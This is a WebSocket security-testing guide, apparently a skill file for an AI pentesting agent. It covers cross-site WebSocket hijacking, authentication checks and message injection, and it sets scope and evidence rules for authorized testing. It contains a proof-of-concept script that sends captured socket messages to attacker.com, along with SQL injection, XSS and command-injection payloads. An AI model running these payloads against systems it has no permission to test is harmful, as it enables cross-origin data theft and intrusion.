---
name: attack-websocket
description: "WebSocket security testing — CSWSH, message injection, auth bypass, origin validation"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - websocket
  - web
  - cswsh
  - injection
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-1385
  - CWE-346
chains_with:
  - attack-cors
prerequisites: []
severity_boost:
  attack-cors: "WebSocket + CORS bypass = cross-origin data theft via WS"
---

# WebSocket Security Testing

## Objective

Exploit WebSocket implementation flaws including cross-site WebSocket hijacking (CSWSH), message injection, and authentication bypass.

## Testing Methodology

### Phase 1: Identify WebSocket Endpoints

```bash
# Look for WebSocket upgrade
curl --max-time 15 --connect-timeout 5 -s -D- https://TARGET/ -H "Upgrade: websocket" -H "Connection: Upgrade"

# Check common paths
for path in /ws /socket /websocket /api/ws /chat /live /realtime; do
  curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET$path" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Version: 13" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" 2>/dev/null | head -1
done
```

### Phase 2: Cross-Site WebSocket Hijacking (CSWSH)

Check if Origin header is validated:

```bash
# Connect with evil origin
websocat -H "Origin: https://evil.com" "wss://TARGET/ws"

# If connection succeeds with evil.com origin → CSWSH is possible
```

**PoC HTML:**
```html
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onmessage = function(e) {
  fetch('https://attacker.com/log?data=' + btoa(e.data));
};
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'get_profile'}));
};
</script>
```

### Phase 3: Authentication Testing

```bash
# Connect without auth token
websocat "wss://TARGET/ws"

# Test token reuse after logout
websocat -H "Cookie: session=EXPIRED_TOKEN" "wss://TARGET/ws"

# Connect with another user's token
websocat -H "Cookie: session=TEST_ACCOUNT_B_TOKEN" "wss://TARGET/ws"
```

### Phase 4: Message Injection

```bash
# Test for SQL injection via WebSocket message
websocat "wss://TARGET/ws" <<< '{"action":"search","query":"test\" OR 1=1--"}'

# XSS via WebSocket message (if rendered in other clients)
websocat "wss://TARGET/ws" <<< '{"action":"chat","message":"<img src=x onerror=alert(1)>"}'

# Command injection
websocat "wss://TARGET/ws" <<< '{"action":"exec","cmd":"printf CYBERSTRIKE_WS_CANARY"}'
```

### Phase 5: Rate Limiting and Message-Size Controls

Only test in a dedicated test environment or when the program explicitly permits it. Do not perform flood or resource-exhaustion testing against production.

```bash
# Three low-volume ping messages; observe whether the server enforces a limit
for i in 1 2 3; do
  printf '{"action":"ping","test_id":"WS_CANARY_%s"}\\n' "$i"
  sleep 1
done | websocat --max-messages 3 "wss://TARGET/ws"

# Harmless 1 KiB marker payload; do not send megabyte-scale messages to production
python3 -c "print('{\\\"data\\\":\\\"' + 'A'*1024 + '\\\"}')" | websocat --max-messages 1 "wss://TARGET/ws"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| CSWSH with a browser-readable sensitive response or unauthorized action demonstrated | Severity depends on data/action and affected users |
| Unauthenticated access to a protected WebSocket channel/message | Severity depends on data/action exposed |
| SQL/command injection through a WebSocket message with concrete impact demonstrated | Severity depends on reachable privileges, data access, and resulting behavior |
| Stored XSS through a WebSocket message that executes in a victim-equivalent test context | Severity depends on reachable users and impact |
| Session not invalidated after logout | Medium (P3) |

## Evidence Requirements

- WebSocket endpoint URL
- Connection with evil Origin (for CSWSH)
- Messages sent and received
- Proof of unauthorized data access or injection

## Tools

- `websocat` (external) — WebSocket CLI client
- Browser DevTools → Network → WS tab

## CSWSH Confirmation Conditions

Treat a successful WebSocket handshake as discovery only. A cross-site WebSocket hijacking claim requires the relevant conditions to be demonstrated together:

- The browser authenticates the connection with ambient credentials such as a session cookie.
- The application does not require an unpredictable per-connection token or equivalent anti-CSRF proof that prevents a hostile site from opening an authenticated socket.
- The server does not enforce a trustworthy `Origin` policy for the authenticated connection, and a browser on a controlled test origin can actually read or perform a protected operation.

Use a test account and a harmless test message. A `101 Switching Protocols` response from an untrusted Origin alone is not proof. Also test authorization after the handshake: every room/channel subscription and message type should enforce ownership and role checks independently.

## Verification and False Positives

- Verify the WebSocket handshake, authentication state, and authorization for each message type. A successful `101 Switching Protocols` handshake does not prove that protected messages are accessible.
- Test with accounts you control. Compare the same message as an authorized and unauthorized role; do not subscribe to other users' private channels or capture their messages.
- For cross-site WebSocket hijacking, confirm browser cookies are sent cross-origin, the server accepts the connection without a trustworthy Origin check, and a protected action/data read is possible. Origin reflection alone is not enough.
- Check message-level authorization after the handshake; many applications authenticate the socket but fail to authorize individual room/channel IDs or commands.
- Keep message counts low and avoid flood/DoS testing unless explicitly permitted. Redact cookies, tokens, and private messages in evidence.
- [uphiago/recon-skills — WebSocket hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-websocket/SKILL.md) (external research reference; not a local Cyber Strike skill path).
- [elementalsouls/Claude-BugHunter — WebSocket hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-websocket/SKILL.md) (external research reference; not a local Cyber Strike skill path).

## References

- [PortSwigger: WebSocket Vulnerabilities](https://portswigger.net/web-security/websockets)
- [OWASP: WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
